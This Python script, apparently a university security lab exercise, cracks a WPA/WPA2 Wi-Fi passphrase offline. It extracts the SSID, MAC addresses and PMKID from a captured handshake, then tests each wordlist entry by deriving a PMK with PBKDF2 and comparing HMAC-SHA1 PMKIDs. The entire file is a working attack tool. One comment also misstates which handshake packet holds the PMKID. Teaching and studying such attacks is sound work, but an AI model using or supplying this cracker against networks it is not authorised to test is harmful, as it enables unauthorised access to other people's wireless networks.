#!/usr/bin/env python
# -*- coding: utf-8 -*-

__author__      = "Rébecca Tevaearai et Rosy-Laure Wonjamouna"
__copyright__   = "Copyright 2017, HEIG-VD"
__license__ 	= "GPL"
__version__ 	= "1.0"
__email__ 		= "abraham.rubinstein@heig-vd.ch"
__status__ 		= "Prototype"

from scapy.all import *
from binascii import a2b_hex, b2a_hex
from pbkdf2 import *
from numpy import array_split
from numpy import array
import hmac, hashlib

# Read capture file
wpa=rdpcap("PMKID_handshake.pcap") 

# Important parameters for key derivation
# On récupère le ssid à partir du paquet 144
ssid = wpa[144].info
# On récupère le MAC de l'AP à partir du paquet 145 (1e paquet du 4way handshake)
APmac = a2b_hex(wpa[145].addr2.replace(':', ''))
# On récupère le MAC du client à partir du paquet 145 (1e paquet du 4way handshake)
Clientmac = a2b_hex(wpa[145].addr1.replace(':', ''))
# On récupère la valeur du PMKID dans le paquet 145 (1e paquet du 4way handshake)
Pmkid = raw(wpa[145])[-20:-4]

# On ouvre et lit le fichier wordlist susceptible de contenir la bonne passphrase
f = open("wordlist.txt")
lines = f.readlines()

for line in lines:
    line = line.replace("\n", "")
    passPhrase  = str.encode(line)

    pmk = pbkdf2(hashlib.sha1, passPhrase, ssid, 4096, 32)
    pmkid = hmac.new(pmk, b"PMK Name" + APmac + Clientmac, hashlib.sha1)
    
    # On compare le PMKID obtenu avec la passphrase potentielle avec le PMKID contenu dans le 4e paquet du 4-way handshake
    if pmkid.digest()[:16] == Pmkid:
        print("Correct passphrase:", passPhrase.decode())
        exit()

print("no correct passphrase")
